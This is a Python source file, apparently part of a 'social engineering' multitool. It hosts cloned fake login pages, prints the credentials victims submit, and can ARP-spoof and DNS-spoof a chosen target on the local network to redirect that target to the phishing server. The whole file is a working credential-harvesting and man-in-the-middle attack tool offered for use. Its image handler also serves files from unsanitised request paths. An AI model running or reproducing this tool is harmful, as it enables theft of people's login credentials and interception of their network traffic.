"""
@MultiTool / Social Engineering
@Version 1.0
@Python 3.10.12
"""
import os,http.server,socketserver,threading
import urllib.parse
#
from src.modules.logger import (Fore,LOGGER)
from src.modules.network_tool import (DNSSpoofer,ARPSpoofer)
#

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if "/images" in self.path:
            # Set the response headers
            if ".svg" in self.path:
                self.send_response(200)
                self.send_header('Content-type', 'image/svg+xml')
                self.end_headers()
            else:
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')  # Adjust content-type as needed
                self.end_headers()

            # Open and read the image file
            try:
                args:list[str] = self.path.split("/")
                args.remove(args[0])
                try:
                    with open("/".join(args), 'rb') as image_file:
                        image_data = image_file.read()
                except Exception as _error:
                    raise FileNotFoundError()
                self.wfile.write(image_data)
            except FileNotFoundError:
                self.send_error(404, 'Image not found')
        else:
            if self.path == "/":
                self.path = "/index.html"
            try:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                with open(self.path.split("/")[1], 'rb') as file:
                    self.wfile.write(file.read())
            except Exception as _error:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'Not Found')

    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            print(parsed_data)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')        

class SOCIAL_ENGINEERING(LOGGER):
    def __init__(self,timezone:str,network_tool,social_engineering_login_websites_dir:str) -> None:
        (self.timezone,self.network_tool,self.login_websites_dir) = (timezone,network_tool,social_engineering_login_websites_dir)
        super().__init__()
        # Fake-Login
        self.available_login_websites:list[str] = self.get_available_login_websites()
        self.current_working_dir:str = os.getcwd()
        self.default_server_ip:str = "0.0.0.0"
        self.default_server_port:int = 5000
        self.DNS_ARP_SPOOFING:bool = False
        #
        
    def check_dir(self,output_dir:str) -> bool:
        try:
            return os.path.exists(output_dir)
        except Exception as e:
            return False
    
    def get_available_login_websites(self) -> list[str]:
        all_items = os.listdir(self.login_websites_dir)
        directories = [item for item in all_items if os.path.isdir(os.path.join(self.login_websites_dir, item))]
        return directories
        
    def fake_login(self) -> None:
        if self.check_dir(self.login_websites_dir) == False:
            self.error(f"Invalid website-directory for fake-logins! ('{self.login_websites_dir}')")
            return
        self.info(f"Available fake-login-services: {Fore.LIGHTMAGENTA_EX}{f', '.join(self.available_login_websites)}")
        service_name:str = input(Fore.YELLOW+"Enter the service-name"+Fore.WHITE+"> "+Fore.RESET).lower().strip()
        if service_name in self.available_login_websites:
            server_ip:str = input(Fore.YELLOW+f"Enter the Server-IP [Default={self.default_server_ip}]"+Fore.WHITE+"> "+Fore.RESET).lower().strip()
            if len(server_ip) == 0 or server_ip == None:
                server_ip = self.default_server_ip
            server_port:str = input(Fore.YELLOW+f"Enter the Server-Port [Default={self.default_server_port}]"+Fore.WHITE+"> "+Fore.RESET)
            if server_port.strip().isdigit() == False:
                server_port = self.default_server_port
            else:
                server_port = int(server_port)
            dns_spoof_status:str = input(Fore.YELLOW+"DNS-Spoof specific target? [y/N]"+Fore.WHITE+"> "+Fore.RESET).lower().strip()
            if dns_spoof_status == "y":
                # wants to DNS-Spoof specific target
                self.info("In order to DNS-Spoof a target, we also need to ARP-Spoof the target")
                network_prefix:str = self.network_tool.get_network_prefix()
                default_gateway_ip = ""
                if len(network_prefix) > 0:
                    default_gateway_ip = ".".join([network_prefix[n] for n in range(0,3)])+".1"
                gateway_ip = input(Fore.WHITE+"<"+f"Gateway IP-Address [Default={default_gateway_ip}]"+Fore.WHITE+"> "+Fore.RESET)
                if len(gateway_ip) == 0:
                    if len(default_gateway_ip) == 0:
                        self.error("Invalid input-gateway-IP-Address & default-gateway-IP-Address is invalid.")
                        return
                    gateway_ip = default_gateway_ip
                target_ip = input(Fore.YELLOW+f"Target IP-Address"+Fore.WHITE+"> "+Fore.RESET)
                if self.network_tool.check_ip_addr(gateway_ip):
                    if self.network_tool.check_ip_addr(target_ip):
                        self.DNS_ARP_SPOOFING = True
                        arpspoofer = ARPSpoofer(timezone=self.timezone)
                        arpspoofer.SPOOFING_STATUS = True
                        threading.Thread(
                            target=arpspoofer.start_spoofing,
                            args=(target_ip,gateway_ip), daemon=True
                        ).start()
                        dnsspoofer = DNSSpoofer(timezone=self.timezone,host_ip=server_ip,host_port=server_port)
                        dnsspoofer.SPOOFING_STATUS = True
                        threading.Thread(
                            target=dnsspoofer.start_spoofing, daemon=True
                        ).start()
                        self.info(f"ARP-Spoofing & DNS-Spoofing Gateway-IP={Fore.LIGHTMAGENTA_EX}{gateway_ip} {Fore.RESET}and Target-IP={Fore.LIGHTCYAN_EX}{target_ip}")
                    else:
                        self.error("Invalid Target-IP-Address!")
                        return
                else:
                    self.error("Invalid Gateway-IP-Address!")
                    return
            self.info(f"Started HTTP-Server at {Fore.GREEN}http://{server_ip}:{server_port}{Fore.WHITE} |{Fore.RESET} Press {Fore.LIGHTBLUE_EX}CTRL+C {Fore.RESET}to exit")
            try:
                try:
                    # Change working-directory
                    os.chdir(self.login_websites_dir+"/"+service_name)
                    handler = MyHandler
                    with socketserver.TCPServer((server_ip,server_port), handler) as httpd:
                        httpd.serve_forever()
                except KeyboardInterrupt as e:
                    if self.DNS_ARP_SPOOFING:
                        arpspoofer.SPOOFING_STATUS = False # Close ARP-Spoofer-Thread
                        dnsspoofer.SPOOFING_STATUS = False # Close DNS-Spoofer-Thread
                    httpd.server_close()
                    raise Exception("Detected Keyboard-Interruption")
            except Exception as _error:
                self.error(str(_error))
            self.info("Stopped HTTP-Server")
        else:
            self.error("Invalid service-name!")
        # Change working-directory to default
        os.chdir(self.current_working_dir)
        self.DNS_ARP_SPOOFING = False # return to default